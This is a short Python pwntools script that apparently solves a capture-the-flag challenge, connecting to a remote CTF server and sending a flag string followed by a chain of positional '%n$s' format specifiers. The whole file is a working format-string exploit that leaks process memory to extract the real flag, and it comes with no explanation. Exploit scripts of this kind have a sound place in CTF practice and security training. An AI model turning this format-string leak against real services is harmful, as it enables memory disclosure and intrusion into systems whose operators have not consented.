from pwn import *

# Set context
context.arch = 'amd64'

def leak_flag():
    r = remote('chals.cyberjousting.com', 1367)
    # The Correct flag + many %s
    payload = b'byuctf{welcome_to_rev_fellas}'
    for i in range(1, 20):
        payload += f"|%{i}$s".encode()
    if len(payload) > 99: payload = payload[:99]
    
    r.sendlineafter(b'?', payload)
    try:
        r.recvuntil(b'Correct! The flag is ')
        print(r.recvall())
    except:
        pass
    r.close()

leak_flag()
